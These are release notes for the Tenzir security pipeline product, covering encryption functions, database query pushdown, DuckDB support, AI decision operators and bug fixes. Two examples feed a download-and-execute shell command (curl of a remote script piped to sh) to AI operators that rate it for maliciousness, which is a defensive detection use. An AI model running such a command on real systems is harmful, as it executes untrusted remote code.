This release introduces a new data model that makes pipelines faster and lets lists hold values of different types. It also adds typed decisions with `ai_decide` and secrets as function arguments.

## 🚀 Features

### Encryption functions

New functions encrypt and decrypt values in pipelines, so that you can protect sensitive fields and still recover them later:

- `encrypt_aes_gcm_siv`, `encrypt_aes_gcm`, and `encrypt_aes_siv` provide authenticated encryption with AES. AES-GCM-SIV and AES-GCM draw a random nonce for every value, while AES-SIV encrypts deterministically, so that you can still group and join by the encrypted value.
- `encrypt_hpke` encrypts with a public key (RFC 9180), so that pipelines can protect data that only the holder of the private key can read.
- `encrypt_ff1` provides format-preserving encryption (NIST SP 800-38G). The output keeps the length and alphabet of the input, and characters outside the alphabet stay in place.

Every function has a `decrypt_*` counterpart. Keys must be secrets, except for the public key of `encrypt_hpke`. The optional `aad` and `tweak` arguments bind ciphertexts to their context:

```tql
let $key = secret("pii-key").decode_hex()
from {card: "4111-1111-1111-1111", email: "alice@example.com"}
card = card.encrypt_ff1(key=$key, tweak="card")
email = email.encrypt_aes_gcm_siv(key=$key)
```

Decryption returns `null` with a warning when the key or the associated data does not match, or when the ciphertext was modified.

*By @mavam.*

### Filter, projection, and limit pushdown for MySQL and SQL Server

The `from_mysql` and `from_microsoft_sql` operators now push filters, projections, and limits into the query they send in `table` mode, so that the database returns only the rows and columns the pipeline needs:

```tql
from_microsoft_sql table="logins", host="db.example.com", database="audit"
where user == "admin" and result != "success"
select user, source
head 10
```

This sends a single `SELECT` with a `WHERE` clause, the two columns, and `TOP (10)`, instead of reading the whole table. Live mode pushes the filter and the columns into every poll.

Results stay the same as when the pipeline evaluates the operators itself. Text compares by bytes, as in TQL, so `user == "admin"` does not match `Admin` even though the default collations of both databases ignore case. Predicates that a database cannot evaluate exactly keep running in the pipeline, such as comparisons on `DECIMAL` columns in both databases, on `FLOAT` and temporal columns in MySQL, and on `datetime` columns in SQL Server. In MySQL, case-insensitive `starts_with` and `ends_with` use the database's lowercasing, which differs from TQL's case folding for a few characters, such as `ß`. A user-provided `sql` query stays as it is.

*By @mavam.*

### Luhn check digits and CRC-32 checksums

New functions validate and compute Luhn check digits, so that card numbers stay valid after format-preserving encryption:

- `is_luhn_valid` tests whether a string of digits has a valid Luhn checksum. It returns `false` for empty strings and for strings with other characters, such as spaces or dashes. A valid checksum is necessary, but not sufficient, for a valid card number.
- `luhn_check_digit` returns the digit that makes a string of digits Luhn-valid when appended.
- `hash_crc32` computes the CRC-32 checksum of a value. CRC-32 is not cryptographic, so use `hash_sha256` or `hmac` to pseudonymize data.

`encrypt_ff1` keeps the length and digits of a card number, but not its check digit. Encrypt the number without its check digit and append a new one to get a valid card number:

```tql
let $key = secret("pii-key").decode_hex()
from {card: "4111111111111111"}
// Only touch card numbers: 12 to 19 digits with a valid check digit.
if card.is_luhn_valid() and card.length_bytes() >= 12 and card.length_bytes() <= 19 {
  // Encrypt all digits except for the check digit at the end.
  card = card.slice(end=-1).encrypt_ff1(key=$key, tweak="card")
  // Append the check digit that matches the encrypted digits.
  card = card + card.luhn_check_digit().string()
}
```

```tql
{
  card: "9684338133581379",
}
```

Decryption works the same way with `decrypt_ff1`. Keep the guard: the round trip recomputes the last digit, so it restores only valid card numbers, and the length check leaves values alone that have too few or too many digits for a card number.

*By @mavam.*

### Named in-memory DuckDB databases

The `from_duckdb` and `to_duckdb` operators now support named in-memory databases such as `:memory:alerts`. Pipelines in the same node that use the same name share a database, so you can read data that another running pipeline writes without creating a file:

```tql
from_duckdb ":memory:alerts", table="alerts"
```

Start the reader after a writer has created the table. The database remains available while at least one operator holds it open. Closing the last operator discards its data; reopening that name starts empty. Different names and separate processes remain isolated. Exactly `:memory:` and an empty path still create private databases. SQL queries against named databases remain read-only in `from_duckdb`.

*By @mavam.*

### New data model

Tenzir now uses a new data model. It brings:

- Faster pipelines through better batching.
- Lists that contain values of different types.
- Secrets as function arguments.

Read more about it in our [blog](https://tenzir.com/blog).

To switch back to the old data model, set `tenzir.nova: false` in your `tenzir.yaml` or the environment variable `TENZIR_NOVA=false`. The old data model is deprecated and will be removed in a future release.

*By @IyeOnline.*

### Read from and write to DuckDB databases

The new [`from_duckdb`](https://tenzir.com/docs/reference/operators/from_duckdb) and [`to_duckdb`](https://tenzir.com/docs/reference/operators/to_duckdb) operators read and write DuckDB databases. Use a file path for a local database, `:memory:` for an in-memory database, or a `quack:` URI for a remote server.

Read a table, run a query with `sql`, or follow new rows with `live=true`:

```tql
from_duckdb "events.duckdb", table="alerts"
```

When reading a table, `from_duckdb` hands downstream filters and limits to DuckDB, so that only the matching rows leave the database:

```tql
from_duckdb "events.duckdb", table="alerts"
where severity >= 3 and rule.starts_with("ET ")
head 100
```

Where DuckDB's semantics differ from TQL, as for `NaN`, arithmetic, struct fields, and strings under a collation, the query spells out TQL's semantics. Predicates that DuckDB cannot evaluate like TQL, such as comparisons on `DECIMAL` columns, run in the pipeline instead.

Excel workbooks can be read offline without downloading or loading an extension:

```tql
from_duckdb ":memory:",
  sql="SELECT * FROM read_xlsx('assets.xlsx', sheet='Assets', header=true)"
```

Use `sheet` to select a worksheet and `header=true` to turn its first row into field names.

Write events to a remote table, creating it if needed:

```tql
subscribe "alerts"
to_duckdb "quack:analytics.example.com:443",
  token=secret("duckdb-token"), table="alerts"
```

Remote SQL runs on the server. TLS is enabled by default except for loopback hosts. Quack is beta: failed writes can leave partial results.

*By @mavam.*

### Record conversion to key-value entries

The new `entries` function converts a record into a list of `{key, value}` entries, with one entry for every top-level field in field order:

```tql
from {
  user: {
    name: "alice",
    age: 42,
  },
}
select entries=user.entries()
```

```tql
{
  entries: [
    {
      key: "name",
      value: "alice",
    },
    {
      key: "age",
      value: 42,
    },
  ],
}
```

Each key is the field name as a string, and a dot in a field name stays part of the key. Each value keeps its original type, including `null`, lists, and records. An empty record produces `[]`, and a null input produces `null`.

The function is the inverse of `collect_record`, so `x.entries().collect_record()` equals `x`. It is called `to_entries` in jq and `Object.entries` in JavaScript.

*By @mavam.*

### Record values as a list

The new `values` function returns the values of a record as a list, in field order:

```tql
from {
  user: {
    name: "alice",
    age: 42,
  },
}
select values=user.values()
```

```tql
{
  values: ["alice", 42],
}
```

Each value keeps its original type, so one list can mix strings, numbers, `null`, lists, and records. Only top-level fields contribute values, and nested records and lists stay intact. An empty record produces `[]`, and a null input produces `null`.

Together with `keys`, the function is the inverse of the two-argument form of `collect_record`: `collect_record(x.keys(), x.values())` equals `x`.

*By @mavam.*

### Secrets in function arguments

Functions now accept secrets for sensitive arguments, such as the key of `hmac` and of the new encryption functions. Pass a `secret` call directly, or bind it with `let` to reuse it, including transformations such as `decode_hex`:

```tql
let $key = secret("hmac-key").decode_hex()
from {user: "alice"}
user = hmac(user, $key)
```

These arguments accept only secrets, so that keys never appear in pipeline definitions.

*By @mavam and @IyeOnline.*

### Suricata schema types for NTP, LDAP, LLMNR, DNP3, drop, and frame events

The bundled Suricata schema now includes types for more EVE JSON event types: `suricata.ntp`, `suricata.ldap`, `suricata.llmnr`, `suricata.dnp3`, `suricata.drop`, and `suricata.frame`. `read_suricata` now parses these events with proper types and no longer warns that the schema is unknown.

The `suricata.http` type now also covers HTTP/2 transactions, which Suricata logs as `http` events. These events carry the `version`, `request_headers`, and `response_headers` fields, and nest the HTTP/2-specific data under `http.http2`. DNS SOA records now include the `mname_truncated` and `rname_truncated` flags.

*By @satta.*

### Typed decisions with ai_decide

The new experimental `ai_decide` operator asks a decision model typed questions about each event and attaches structured answers instead of generated text. It works with any endpoint that serves the System One API, such as hosted Jev or a local Laya server.

Ask one question with a positional argument. Without further arguments, the model answers yes or no with a probability. Add `choices` to pick one of several named options, or `scale` to rate the event on an ordered list of levels:

```tql
from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_decide "How risky is this command for the host?",
  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
  state=cmd,
  model="jev-latest",
  endpoint="https://api.typesafe.ai/v1",
  api_key=secret("typesafe-api-key")
where ai.decide.answer.score >= 1.5
```

To ask several questions in one request, pass a `questions` record and read each answer from `ai.decide.answers.<id>`. Tenzir checks the questions when it compiles the pipeline, so mistakes such as an unknown question type, missing or empty criteria, or a scale given as a record fail before the pipeline runs.

Like `ai_prompt`, the operator preserves input order, runs up to `concurrency` requests at a time, and reports the model, token usage, truncation, and latency. If a request fails, it emits a warning and writes `null` to the result field, so a pipeline can fail open with `where ai.decide == null or ...`.

*By @mavam.*

### Windows Event Forwarding without a Windows collector

The new experimental [`accept_wef`](https://tenzir.com/docs/reference/operators/accept_wef) operator acts as a Windows Event Collector for source-initiated Windows Event Forwarding (WEF). Windows hosts forward events to Tenzir directly, so you no longer need a Windows Event Collector server or an agent on every host.

Hosts in an Active Directory domain authenticate with Kerberos. Point the subscription manager in your Group Policy at Tenzir, then define the subscriptions that the hosts should pick up:

```tql
let $logons = r#"
<QueryList>
  <Query Id="0">
    <Select Path="Security">*[System[(EventID=4624 or EventID=4625)]]</Select>
  </Query>
</QueryList>
"#
accept_wef kerberos={keytab: "/etc/tenzir/wef.keytab"},
  subscriptions=[{id: "security-logons", query: $logons}]
event = data.parse_winlog()
```

Hosts outside of a domain authenticate with client certificates through the `tls` option instead.

Each output event contains the raw event XML in `data`, the peer address, and the authenticated client, its claimed machine name, and the subscription in `wef`.

The operator stores where each client left off in the state directory, so clients resume after a restart without gaps. Subscriptions can target specific clients with `clients: {only: [...]}` or `clients: {except: [...]}`, and specific subscription manager URLs with `uri`. Clients may compress their batches.

*By @mavam.*

## 🔧 Changes

### Bounded memory for limited sorting

Sorting followed by `head` now uses memory proportional to the requested result size instead of the full input. This makes selecting a few results from a large input faster and more memory-efficient.

Get the 10 most recent events:

```tql
sort -timestamp
head 10
```

The same improvement applies to the final sort in `top` and `rare`. Find the 10 most common source IPs:

```tql
top src_ip
head 10
```

Or find the 10 least common source IPs:

```tql
rare src_ip
head 10
```

In a local benchmark, selecting 10 events from two million shuffled events was **4.2× faster** and used **65% less peak process memory** than a full sort. Small result sets benefited most; results depend on the workload and hardware.

These pipelines still inspect all input events, and `top` and `rare` still keep counts for every distinct value. Result ordering and null placement are unchanged. Without a downstream limit, `sort` still buffers the full input.

*By @mavam.*

### Case-insensitive prefix and suffix filters in ClickHouse and DuckDB

The `from_clickhouse` and `from_duckdb` operators now push case-insensitive `starts_with` and `ends_with` filters into the database instead of evaluating them in the pipeline:

```tql
from_clickhouse table="logs.events"
where message.starts_with("error", ignore_case=true)
```

The database lowercases text one character at a time, which matches TQL for ASCII and most other text. For a few characters, results can differ from evaluating the filter in the pipeline. TQL applies full Unicode case folding, so `"Straße".starts_with("strass", ignore_case=true)` is `true`, while the database finds no match.

*By @mavam.*

### Default ai_prompt input without earlier AI results

By default, `ai_prompt` sent the entire event to the model, including results that earlier AI calls had written to the event. In the following pipeline, the second call sent the summary from the first call along with its token usage and latency, although the classification only needs the alert:

```tql
from {alert: "PowerShell downloaded a script from a newly registered domain."}
ai_prompt model="qwen3.8", system="Summarize this alert.", into=ai.summary
ai_prompt model="qwen3.8", system="Classify this alert.", into=ai.label
```

The default input now leaves out the `ai` field and the `into` field, so the second call sends only `{"alert": "…"}`. To send earlier results anyway, pass them explicitly, for example with `data={alert: alert, summary: ai.summary.text}`, or send the whole event with `data=this`.

*By @mavam.*

### Filter and time-window pushdown for SentinelOne

You can now query SentinelOne Data Lake entirely in TQL, without writing PowerQuery or passing `query`, `start`, or `end` to `from_sentinelone_data_lake`:

```tql
let $end = now()
from_sentinelone_data_lake "https://<tenant>.sentinelone.net",
  token=secret("sentinelone-console-token")
where timestamp >= $end - 1h and timestamp < $end
where severity > 3 and message.starts_with("alert")
head 100
```

The operator builds the remote query from supported filters, timestamp bounds, and limits. Exploratory pipelines return complete parsed events, including fields you never named. Restrictive projections such as `select event.type, account.id` can use efficient column retrieval instead. Selection is automatic: no retrieval flag or separate schema-discovery step is needed. Whole-event inspection, dynamic field access, and whole-record selections remain supported.

TQL bounds supply omitted time arguments, including historical windows outside the default past 24 hours. Every original filter still runs locally, and `head` counts events after that filtering. Generated reads continue beyond the default query result cap when needed, including across events with identical timestamps. All requests share the operator's timeout; a later-page failure marks the run incomplete even if earlier events have already been emitted. Filters that exceed the remote query's size limit stay local without preventing smaller filters from contributing to the request.

If no supported constraint reaches the source, the operator reports a runtime error before contacting SentinelOne. A rejected generated query fails rather than falling back to an unrestricted scan. You can still provide `query`, `start`, and `end` as explicit overrides. An explicit PowerQuery and its request window stay unchanged; downstream TQL filters and limits run locally to preserve the rows selected by SentinelOne's result cap.

*By @mavam.*

### Filters fold constants

The optimizer now simplifies `where` filters. It evaluates parts of a predicate that do not depend on the event, drops predicates that always hold, and prunes `and`/`or` branches that cannot match. For example, `class_uid = 3002 | where class_uid == 3002 and src_ip == 1.2.3.4` sends only `src_ip == 1.2.3.4` to the source, and `where class_uid == 4001` keeps no events at all.

*By @mavam.*

### Filters move through assignments and drop

The optimizer now moves `where` filters in front of `set` and `drop` by rewriting them over the operator input. For example, `y = x | where y == 42` becomes `where x == 42 | y = x`. This also covers moved fields, constants, record literals, spread, and whole-event assignments such as `this = {source: this, ocsf: {}}` and `this = move this.ocsf`. A field that `move` or `drop` removes reads as `null`.

As a result, a filter on OCSF fields after a normalization operator now reaches the source, which can then fetch only the matching events. Filters that depend on nondeterministic values, such as `now()`, stay where they are.

*By @mavam.*

### Narrower input reads for aggregations

`summarize` now tells upstream operators which fields it needs, so sources that support projections, such as `read_parquet`, read only the grouping keys and aggregate arguments instead of entire events. This also applies to `top` and `rare` and to `summarize` inside subpipelines, such as in `group`. A `summarize` with `emit`, `mode`, or `output` options still reads entire events.

*By @mavam.*

### Regular expression filters in ClickHouse and DuckDB

The `from_clickhouse` and `from_duckdb` operators now push `match_regex` filters into the database instead of evaluating them in the pipeline:

```tql
from_clickhouse table="logs.events"
where message.match_regex("^ERROR [0-9]+")
```

TQL and both databases use the RE2 library with the same options, so the pattern matches the same text: `.` does not match a newline, and `^` and `$` match only at the start and end of the string. A database bundles its own release of RE2, which may disagree with TQL on rarely used syntax. For ClickHouse `String` values that are not valid UTF-8, the result is undefined.

*By @mavam.*

### Secret keys for hmac

The key of `hmac` must now be a secret, so that it stays out of pipeline definitions. Read the key from a secret store instead of passing a string:

```tql
from {user: "alice"}
user = hmac(user, secret("hmac-key"))
```

A plain string key is an error when the pipeline starts. Transformations of a secret, such as `secret("hmac-key").decode_hex()`, still count as secrets.

*By @mavam.*

### Secret seeds for Crypto-PAn

The `seed` of `encrypt_cryptopan` and `decrypt_cryptopan` must now be a secret that holds exactly 32 bytes, instead of a string of hexadecimal digits:

```tql
let $seed = secret("cryptopan-key").decode_hex()
from {src_ip: 192.0.2.1}
src_ip = src_ip.encrypt_cryptopan(seed=$seed)
```

To keep your existing pseudonyms, store the same 64 hexadecimal digits in the secret store and decode them with `decode_hex`. Previously, the functions padded shorter seeds with zeros and truncated longer ones; pad or truncate such seeds to 64 digits before you store them. A seed of another size is now an error when the pipeline starts. Without a `seed`, the functions still use a key of zeros.

*By @mavam.*

### Secrets are censored on assignment

Assigning a secret to a field with `set` or `select` now stores `"***"` instead and emits a warning. This includes secrets nested in records or lists. `lag` and `context::enrich` with `format="ocsf"` censor secrets the same way. Secrets remain usable within expressions, for example `digest = hmac(value, secret("key"))`, but can no longer travel with events.

*By @IyeOnline.*

### SentinelOne queries through the console API

The `from_sentinelone_data_lake` operator now uses SentinelOne's Long Running Query API instead of the V1 PowerQuery endpoint, which retires on February 15, 2027.

Replace your regional `xdr.*.sentinelone.net` URL with your tenant's console URL and replace scoped SDL Log Read keys with a console service-user API token:

```tql
from_sentinelone_data_lake "https://<tenant>.sentinelone.net",
  token=secret("sentinelone-console-token"),
  query="severity > 3 | columns id | limit 5000",
  account_ids=["1234567890123456789"],
  timeout=2min
```

The optional `account_ids` list selects specific accounts instead of tenant scope. Without explicit time bounds, queries cover the past 24 hours. The new `timeout` option bounds launching and polling, including retries, to `3min` by default. On expiry, the operator attempts to cancel the query and reports an error. PowerQuery still defaults to at most 1,000 rows for queries without `limit` or `group`; include `| limit N` in the query to request more rows. Results are read from the final response without paging.

Invalid `Retry-After` headers, including delays outside the supported numeric range, fail the query instead of triggering an early retry.

*By @mavam.*

## 🐞 Bug fixes

### `to_clickhouse` no longer crashes on IP addresses and subnets on macOS

On macOS, `to_clickhouse` no longer fails an internal assertion when writing fields of type `ip` or `subnet`.

*By @mavam.*

### Clean shutdown of live MySQL and SQL Server reads

Stopping a pipeline that reads with `from_mysql live=true` or `from_microsoft_sql live=true`, for example with Ctrl+C or a node shutdown, now ends it cleanly. Previously, `from_mysql` crashed Tenzir with an internal error, and `from_microsoft_sql` kept polling until the pipeline reported that it was aborted.

*By @mavam.*

### Client certificates of TLS servers

Operators that accept TLS connections, such as `accept_http`, `accept_opensearch`, `accept_otlp`, `accept_splunk`, `accept_wef`, and `serve_http`, now verify client certificates only against `tls.client_ca`. Previously, they also trusted the CA certificates of `tls.cacert`, which defaults to the CA bundle of the system, so a client certificate from any public CA passed verification even when `tls.client_ca` named a private CA.

Without `tls.client_ca`, these operators no longer ask clients for a certificate.

A TLS server whose certificate or CA files fail to load now reports the error when the pipeline starts instead of hanging.

*By @mavam.*

### Column defaults for nulls in ClickHouse

The `to_clickhouse` operator now writes the column default for a `null` in a non-`Nullable` column that has a `DEFAULT`, just like for an event without the field. Previously, such events were dropped with an `incompatible type` warning.

For example, given a table with the column `activity_id Int32 DEFAULT 0`, both of these events now arrive with `activity_id = 0`:

```tql
from {class_uid: 4001, activity_id: null},
     {class_uid: 4001}
to_clickhouse table="ocsf.events", mode="append"
```

ClickHouse evaluates expression defaults as well, such as `DEFAULT class_uid % 1000`. This also applies to `Array`, `Tuple`, and `JSON` columns with a `DEFAULT`, which previously stored an empty value for a `null`. A `null` for a `Nullable` column is still written as `NULL`, and a `null` for a non-`Nullable` column without a `DEFAULT` behaves as before.

*By @zedoraps.*

### Data loss with percentage-based disk budgets

Custom disk-usage checks such as `tenzir-df-percent` once again preserve data when usage is below the configured watermarks. A regression in Tenzir v6.19.0 treated percentage thresholds as byte limits, which could delete existing data and newly ingested events even with ample free disk space. Eviction now checks disk usage again after each deletion batch. This fix cannot restore data already deleted.

*By @tobim.*

### Hang when reading stdin from a redirected file

Pipelines that read stdin now finish when stdin is redirected from a file:

```sh
tenzir 'from_stdin { read_json }' < events.json
```

Previously, such pipelines hung after reading the file on macOS, which also affected `/dev/null` and pipelines with an implicit stdin source, such as `tenzir 'where x > 1' < events.json`. Piping into `tenzir` worked and is unaffected.

*By @mavam.*

### Heterogeneous lists in served events

Schema definitions, as reported by the `/serve` endpoints and by `measure _exact_definition=true`, no longer describe the elements of a list as a `union`, which no API consumer can express. Nulls are neutral, so `[1, null]` is a `list<int64>` again, and records unify into the union of their fields, so `[{a: 1}, {b: 2}]` is a `list<record{a: int64, b: int64}>`. Only lists whose elements genuinely disagree, such as `[1, "x"]`, become a `list<string>`.

For such lists, the `/serve` endpoints stringify the elements of the served events so that the data matches the definition. Nulls stay null. This affects only the API; `write_json` and friends keep printing the values verbatim.

*By @aljazerzen.*

### Invalid ai_prompt endpoints no longer crash or reveal secrets

The `ai_prompt` operator no longer crashes the pipeline when the `endpoint` is not a valid URL, for example because its port is out of range. It now reports a regular error and doesn't include the resolved endpoint in the message, so an endpoint passed as a secret stays hidden.

*By @mavam.*

### No crash when a TCP client disconnects during accept

The node no longer crashes when a TCP client connects to a listening operator and resets the connection before the node has finished accepting it. Previously, this terminated the entire node with the message `setFromSocket() failed: Socket not connected`. Port scanners, load balancer health checks, and clients with short connect timeouts could trigger this. This affects all operators that accept incoming TCP connections, namely `accept_tcp`, `accept_relp`, and `serve_tcp`.

*By @tobim.*

### Optional temperature in ai_prompt

The `ai_prompt` operator no longer sends a `temperature` to the model unless you set one. Previously, it always sent `temperature=0.0`, so models that reject the parameter, such as `gpt-5-mini`, failed every request with an HTTP 400 error.

Leave out `temperature` to let the model use its own default:

```tql
from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
ai_prompt model="gpt-5-mini",
          endpoint="https://api.openai.com/v1",
          api_key=secret("openai-api-key"),
          system="Is this command malicious? Reply with JSON."
```

Set `temperature` explicitly to keep the previous behavior, for example `temperature=0.0`.

*By @mavam.*

### Spurious import errors when stopping pipelines that use `python`

Stopping a pipeline while its `python` operator is still starting no longer logs misleading Python tracebacks such as `ModuleNotFoundError: No module named 'tenzir_operator'`. The operator now shuts down its Python process before it removes the process's virtual environment.

*By @tobim.*
